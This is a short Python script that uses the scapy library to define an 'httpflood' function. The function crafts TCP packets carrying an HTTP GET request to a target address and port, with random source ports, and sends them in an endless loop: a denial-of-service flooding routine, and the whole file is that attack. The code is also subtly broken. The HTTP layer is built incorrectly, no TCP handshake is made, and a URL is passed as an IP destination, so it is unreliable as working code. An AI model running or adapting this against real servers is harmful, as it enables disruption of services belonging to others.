from scapy.all import *



def httpflood(target_url,targetport):

    request = Ether() / IP(dst=target_url) / TCP(dport=targetport, sport=RandShort()) / HTTP(method="GET", url="/")

    sendp(request, loop=1, verbose=1)